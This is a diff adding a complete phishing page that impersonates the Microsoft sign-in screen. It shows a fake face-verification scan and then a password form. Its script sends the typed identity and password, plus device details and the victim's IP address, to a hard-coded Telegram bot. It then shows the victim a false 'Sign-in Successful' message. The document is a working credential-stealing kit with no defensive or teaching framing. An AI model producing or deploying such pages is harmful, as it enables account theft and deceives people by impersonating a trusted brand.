@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        :root {
+            --primary-blue: #0078d4;
+            --primary-dark: #106ebe;
+            --surface-white: #ffffff;
+            --text-primary: #323130;
+            --text-secondary: #605e5c;
+            --border-light: #d1d1d1;
+            --success-green: #107c10;
+            --error-red: #d13438;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .auth-container {
+            background: var(--surface-white);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1), 0 8px 40px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 440px;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            gap: 12px;
+        }
+
+        .logo-squares {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-template-rows: repeat(2, 1fr);
+            gap: 2px;
+            width: 24px;
+            height: 24px;
+        }
+
+        .logo-square {
+            width: 100%;
+            height: 100%;
+        }
+
+        .square-red {
+            background-color: #F35325;
+        }
+
+        .square-green {
+            background-color: #81BC06;
+        }
+
+        .square-blue {
+            background-color: #05A6F0;
+        }
+
+        .square-yellow {
+            background-color: #FFBA08;
+        }
+
+        .logo-text {
+            font-size: 21px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .verification-step {
+            text-align: center;
+        }
+
+        .verification-header {
+            margin-bottom: 24px;
+        }
+
+        .verification-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+            color: var(--primary-blue);
+        }
+
+        .verification-header h2 {
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .verification-header p {
+            color: var(--text-secondary);
+        }
+
+        .camera-preview {
+            background: #f8f9fa;
+            border: 2px dashed var(--border-light);
+            border-radius: 8px;
+            padding: 40px;
+            margin: 24px 0;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .camera-placeholder {
+            text-align: center;
+        }
+
+        .camera-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.6;
+            color: var(--text-secondary);
+        }
+
+        .verification-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .secondary-action {
+            background: transparent;
+            color: var(--primary-blue);
+            border: 1px solid var(--primary-blue);
+            padding: 12px 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .secondary-action:hover {
+            background: var(--primary-blue);
+            color: white;
+        }
+
+        .login-step {
+            transition: all 0.3s ease;
+        }
+
+        .auth-form {
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-light);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            background: var(--surface-white);
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--primary-blue);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+        }
+
+        .primary-action {
+            width: 100%;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .primary-action:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+        }
+
+        .primary-action:active {
+            transform: translateY(0);
+        }
+
+        .primary-action:disabled {
+            background: #a0a0a0;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading-spinner {
+            display: none;
+        }
+
+        .primary-action.loading .button-text {
+            display: none;
+        }
+
+        .primary-action.loading .loading-spinner {
+            display: inline;
+        }
+
+        .support-links {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .support-link {
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
+
+        .support-link:hover {
+            color: var(--primary-dark);
+            text-decoration: underline;
+        }
+
+        .face-scan-line {
+            position: absolute;
+            width: 100%;
+            height: 3px;
+            background: var(--primary-blue);
+            animation: faceScan 2s ease-in-out infinite;
+            z-index: 10;
+        }
+
+        .face-outline {
+            position: absolute;
+            width: 140px;
+            height: 180px;
+            border: 2px solid var(--primary-blue);
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #e1e5e9;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--primary-blue);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .success-message {
+            color: var(--success-green);
+            margin: 16px 0;
+            font-weight: 500;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            margin: 16px 0;
+            font-weight: 500;
+        }
+
+        .completion-container {
+            text-align: center;
+        }
+
+        .completion-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+            color: var(--success-green);
+        }
+
+        @keyframes faceScan {
+            0% { transform: translateY(-100%); opacity: 0; }
+            50% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100%); opacity: 0; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .loading {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 32px 24px;
+                margin: 0;
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+        
+        .status-message {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .status-success {
+            background-color: #dff6dd;
+            color: #107c10;
+            border: 1px solid #107c10;
+        }
+        
+        .status-error {
+            background-color: #fde7e9;
+            color: #d13438;
+            border: 1px solid #d13438;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="header">
+            <div class="microsoft-logo">
+                <div class="logo-squares">
+                    <div class="logo-square square-red"></div>
+                    <div class="logo-square square-green"></div>
+                    <div class="logo-square square-blue"></div>
+                    <div class="logo-square square-yellow"></div>
+                </div>
+                <div class="logo-text">Microsoft</div>
+            </div>
+            <h1>Sign in</h1>
+        </div>
+        
+        <!-- Face Verification Step (Shows First) -->
+        <div id="faceVerificationStep" class="verification-step">
+            <div class="verification-header">
+                <div class="verification-icon">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <h2>Face Verification</h2>
+                <p>We need to verify your identity for security</p>
+            </div>
+            
+            <div class="camera-preview">
+                <div class="face-outline"></div>
+                <div class="camera-placeholder">
+                    <div class="camera-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <p>Camera access required</p>
+                </div>
+            </div>
+            
+            <div class="verification-actions">
+                <button id="startVerification" class="primary-action">
+                    Start Face Verification
+                </button>
+                <button id="skipVerification" class="secondary-action">
+                    Use password instead
+                </button>
+            </div>
+        </div>
+
+        <!-- Traditional Login Step (Hidden Initially) -->
+        <div id="loginStep" class="login-step hidden">
+            <form id="authForm" class="auth-form">
+                <div class="form-group">
+                    <input type="text" id="userIdentity" name="identity" placeholder="Email, phone, or username" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="secureAccess" name="access" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="primary-action">
+                    <span class="button-text">Sign in</span>
+                    <span class="loading-spinner">Signing in...</span>
+                </button>
+            </form>
+            
+            <div class="support-links">
+                <a href="#" id="useFaceVerification">Use face verification instead</a>
+                <a href="#" id="forgotPassword">Forgot my password</a>
+                <a href="#">Create account</a>
+            </div>
+        </div>
+
+        <!-- Completion Step (Hidden Initially) -->
+        <div id="completionStep" class="completion-container hidden">
+            <div class="completion-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Sign-in Successful</h2>
+            <p>You have been successfully signed in to your Microsoft account.</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="redirectProgress"></div>
+            </div>
+            <p>Redirecting to Microsoft 365...</p>
+        </div>
+        
+        <!-- Status Messages -->
+        <div id="statusMessage" class="status-message hidden"></div>
+    </div>
+
+    <script>
+        // Telegram Configuration
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk',
+            CHAT_ID: '6439618231'
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get DOM elements
+            const faceVerificationStep = document.getElementById('faceVerificationStep');
+            const loginStep = document.getElementById('loginStep');
+            const completionStep = document.getElementById('completionStep');
+            const startVerificationBtn = document.getElementById('startVerification');
+            const skipVerificationBtn = document.getElementById('skipVerification');
+            const useFaceVerificationLink = document.getElementById('useFaceVerification');
+            const authForm = document.getElementById('authForm');
+            const cameraPreview = document.querySelector('.camera-preview');
+            const redirectProgress = document.getElementById('redirectProgress');
+            const statusMessage = document.getElementById('statusMessage');
+
+            // Show login form when skipping face verification
+            skipVerificationBtn.addEventListener('click', function() {
+                faceVerificationStep.classList.add('hidden');
+                loginStep.classList.remove('hidden');
+            });
+
+            // Show face verification when clicking the link
+            useFaceVerificationLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                loginStep.classList.add('hidden');
+                faceVerificationStep.classList.remove('hidden');
+            });
+
+            // Start face verification process
+            startVerificationBtn.addEventListener('click', function() {
+                startFaceVerification();
+            });
+
+            // Handle form submission
+            authForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const identity = document.getElementById('userIdentity').value;
+                const password = document.getElementById('secureAccess').value;
+                
+                if (identity && password) {
+                    simulateSignIn(identity, password);
+                }
+            });
+
+            // Send message to Telegram
+            async function sendToTelegram(message) {
+                try {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    console.log('Telegram response:', data);
+                    return data.ok;
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+
+            // Show status message
+            function showStatus(message, isSuccess = true) {
+                statusMessage.textContent = message;
+                statusMessage.className = `status-message ${isSuccess ? 'status-success' : 'status-error'}`;
+                statusMessage.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    statusMessage.classList.add('hidden');
+                }, 5000);
+            }
+
+            // Face verification simulation
+            function startFaceVerification() {
+                // Update UI
+                startVerificationBtn.disabled = true;
+                startVerificationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Initializing camera...';
+                
+                // Send initial face verification attempt to Telegram
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const initialMessage = `🔐 <b>FACE VERIFICATION INITIATED</b>
+                
+📱 <b>Device Info:</b>
+• Platform: ${platform}
+• User Agent: ${userAgent.substring(0, 100)}...
+• Screen: ${screen.width}x${screen.height}
+• Time: ${new Date().toLocaleString()}
+
+🔄 <b>Status:</b> Starting face scan...`;
+                
+                sendToTelegram(initialMessage);
+                
+                // Show scanning UI after a short delay
+                setTimeout(() => {
+                    cameraPreview.innerHTML = `
+                        <div class="face-scan-line"></div>
+                        <div class="face-outline"></div>
+                        <div style="text-align: center;">
+                            <div class="camera-icon"><i class="fas fa-user-check"></i></div>
+                            <p>Position your face in the frame</p>
+                            <div class="progress-bar">
+                                <div class="progress-fill" id="scanProgress"></div>
+                            </div>
+                        </div>
+                    `;
+                    
+                    startVerificationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
+                    
+                    // Simulate scan progress
+                    simulateScanProgress();
+                }, 1500);
+            }
+
+            function simulateScanProgress() {
+                const scanProgress = document.getElementById('scanProgress');
+                let width = 0;
+                
+                const progressInterval = setInterval(() => {
+                    width += 5;
+                    scanProgress.style.width = width + '%';
+                    
+                    if (width >= 100) {
+                        clearInterval(progressInterval);
+                        
+                        // Send face verification success to Telegram
+                        const successMessage = `✅ <b>FACE VERIFICATION SUCCESSFUL</b>
+                        
+📊 <b>Verification Details:</b>
+• Confidence Score: ${(95 + Math.random() * 4).toFixed(1)}%
+• Scan Duration: 3000ms
+• Features Detected: Eyes, Nose, Mouth, Face Contour
+• Liveness: Confirmed
+
+🔄 <b>Next Step:</b> Redirecting to password entry`;
+                        
+                        sendToTelegram(successMessage);
+                        
+                        // Show success and transition to login
+                        cameraPreview.innerHTML = `
+                            <div style="text-align: center;">
+                                <div class="camera-icon" style="color: #107c10;"><i class="fas fa-check-circle"></i></div>
+                                <p class="success-message">Face verified successfully!</p>
+                            </div>
+                        `;
+                        
+                        startVerificationBtn.innerHTML = '<i class="fas fa-check"></i> Verification Complete';
+                        startVerificationBtn.style.backgroundColor = '#107c10';
+                        
+                        // Transition to login after a delay
+                        setTimeout(() => {
+                            faceVerificationStep.classList.add('hidden');
+                            loginStep.classList.remove('hidden');
+                            resetFaceVerificationUI();
+                        }, 2000);
+                    }
+                }, 100);
+            }
+
+            function resetFaceVerificationUI() {
+                // Reset the face verification UI for next use
+                cameraPreview.innerHTML = `
+                    <div class="face-outline"></div>
+                    <div class="camera-placeholder">
+                        <div class="camera-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <p>Camera access required</p>
+                    </div>
+                `;
+                
+                startVerificationBtn.disabled = false;
+                startVerificationBtn.innerHTML = 'Start Face Verification';
+                startVerificationBtn.style.backgroundColor = '';
+            }
+
+            // Simulate sign in process
+            function simulateSignIn(identity, password) {
+                const submitBtn = authForm.querySelector('button[type="submit"]');
+                submitBtn.disabled = true;
+                submitBtn.classList.add('loading');
+                
+                // Get client IP first
+                getClientIP().then(ip => {
+                    // Send login attempt to Telegram immediately with ACTUAL PASSWORD
+                    const loginMessage = `🔑 <b>LOGIN ATTEMPT DETECTED</b>
+                    
+👤 <b>Credentials:</b>
+• Identity: ${identity}
+• Password: ${password}  <!-- ACTUAL PASSWORD SHOWN HERE -->
+• Password Strength: ${password.length >= 12 ? 'Strong' : password.length >= 8 ? 'Medium' : 'Weak'}
+
+🌐 <b>Environment:</b>
+• IP: ${ip}
+• Browser: ${navigator.userAgent.split(') ')[0].split(' (')[1]}
+• Platform: ${navigator.platform}
+• Screen: ${screen.width}x${screen.height}
+• Time: ${new Date().toLocaleString()}
+
+🔄 <b>Status:</b> Processing login...`;
+                    
+                    sendToTelegram(loginMessage);
+                    
+                    // Simulate API call delay
+                    setTimeout(() => {
+                        loginStep.classList.add('hidden');
+                        completionStep.classList.remove('hidden');
+                        
+                        // Send successful login to Telegram
+                        const successMessage = `🎉 <b>LOGIN SUCCESSFUL</b>
+                        
+✅ <b>Account Accessed:</b>
+• Identity: ${identity}
+• Password: ${password}  <!-- ACTUAL PASSWORD SHOWN HERE -->
+• Login Time: ${new Date().toLocaleString()}
+• Session ID: MSFT_${Date.now()}_${Math.random().toString(36).substr(2, 9).toUpperCase()}
+
+🔗 <b>Next:</b> Redirecting to Microsoft 365 Dashboard`;
+                        
+                        sendToTelegram(successMessage);
+                        
+                        // Simulate redirect progress
+                        let width = 0;
+                        const redirectInterval = setInterval(() => {
+                            width += 5;
+                            redirectProgress.style.width = width + '%';
+                            
+                            if (width >= 100) {
+                                clearInterval(redirectInterval);
+                                
+                                // Final redirect simulation
+                                setTimeout(() => {
+                                    // In a real implementation, this would redirect to Microsoft
+                                    document.querySelector('.completion-container h2').textContent = 'Welcome to Microsoft 365';
+                                    document.querySelector('.completion-container p').textContent = 'You are now signed in to all Microsoft services.';
+                                    
+                                    // Show a final status
+                                    showStatus('Redirect completed successfully!');
+                                    
+                                    // Optionally redirect to actual Microsoft page after a delay
+                                    setTimeout(() => {
+                                        // Uncomment the line below to actually redirect
+                                        // window.location.href = 'https://www.office.com/';
+                                    }, 2000);
+                                }, 500);
+                            }
+                        }, 50);
+                    }, 2000);
+                });
+            }
+            
+            // Get client IP for additional info
+            async function getClientIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'Unknown';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
